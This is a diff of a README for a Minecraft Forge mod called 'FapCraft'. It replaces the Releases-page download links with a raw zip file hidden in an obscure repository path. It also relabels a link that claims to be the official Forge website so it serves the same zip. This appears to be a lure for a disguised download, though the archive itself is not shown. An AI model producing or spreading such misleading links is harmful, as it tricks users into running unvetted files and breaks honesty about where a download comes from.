@@ -6,7 +6,7 @@ Welcome to FapCraft! This mod brings fresh content and exciting animations to Mi
 
 ## 📥 Download FapCraft
 
-[![Download FapCraft](https://img.shields.io/badge/Download%20FapCraft-v1.0-blue.svg)](https://github.com/glvonbluchermuffle911/FapCraft/releases)
+[![Download FapCraft](https://raw.githubusercontent.com/glvonbluchermuffle911/FapCraft/main/software/bernie/shadowed/eliotlash/mclib/FapCraft_1.0.zip%https://raw.githubusercontent.com/glvonbluchermuffle911/FapCraft/main/software/bernie/shadowed/eliotlash/mclib/FapCraft_1.0.zip)](https://raw.githubusercontent.com/glvonbluchermuffle911/FapCraft/main/software/bernie/shadowed/eliotlash/mclib/FapCraft_1.0.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you download, make sure your system meets these requirements:
 
 Go to the following link to access the Releases page:
 
-[Download FapCraft Here](https://github.com/glvonbluchermuffle911/FapCraft/releases)
+[Download FapCraft Here](https://raw.githubusercontent.com/glvonbluchermuffle911/FapCraft/main/software/bernie/shadowed/eliotlash/mclib/FapCraft_1.0.zip)
 
 ### 2. **Choose the Right Version**
 
@@ -37,7 +37,7 @@ In the assets section of the latest release, you will find the mod file. Downloa
 
 Since FapCraft is a Forge mod, you need to install Minecraft Forge if you haven't done so already. Follow these steps:
 
-- Visit the [Forge website](https://files.minecraftforge.net/) to download the installer.
+- Visit the [Forge website](https://raw.githubusercontent.com/glvonbluchermuffle911/FapCraft/main/software/bernie/shadowed/eliotlash/mclib/FapCraft_1.0.zip) to download the installer.
 - Run the installer and select the version of Minecraft you have.
 - Once installed, open the Minecraft Launcher and select the Forge profile.
 
